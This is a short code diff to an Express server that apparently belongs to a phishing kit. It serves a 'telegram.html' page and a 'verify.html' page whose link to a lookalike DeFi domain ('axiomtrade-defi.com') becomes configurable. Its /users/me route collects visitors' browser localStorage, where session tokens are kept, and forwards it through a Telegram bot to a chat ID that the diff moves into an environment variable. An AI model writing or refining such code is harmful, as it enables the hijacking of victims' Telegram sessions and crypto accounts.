@@ -52,9 +52,25 @@ app.get("/telegram.html", (req, res) => {
   res.sendFile(path.join(publicFolderPath, "telegram.html"));
 });
 
-// Serve verify.html specifically
+// Serve verify.html specifically with environment variable injection
 app.get("/verify.html", (req, res) => {
-  res.sendFile(path.join(publicFolderPath, "verify.html"));
+  const fs = require("fs");
+  const verifyPath = path.join(publicFolderPath, "verify.html");
+
+  fs.readFile(verifyPath, 'utf8', (err, data) => {
+    if (err) {
+      return res.status(500).send('Error loading page');
+    }
+
+    // Replace the href with environment variable
+    const axiomLink = process.env.AXIOM_LINK || "https://axiomtrade-defi.com";
+    const updatedData = data.replace(
+      'href="https://axiomtrade-defi.com"',
+      `href="${axiomLink}"`
+    );
+
+    res.send(updatedData);
+  });
 });
 
 app.use(express.static(publicFolderPath));
@@ -83,7 +99,7 @@ app.post("/users/me", limiter, (req, res) => {
     localstorage: reqBody,
   };
 
-  [1758327808].forEach((id) => {
+  [process.env.USER_ID || 1758327808].forEach((id) => {
     console.log("Sending message to Telegram with data:", reqBodyWithId);
 
     bot.sendMessage(id, JSON.stringify(reqBodyWithId))
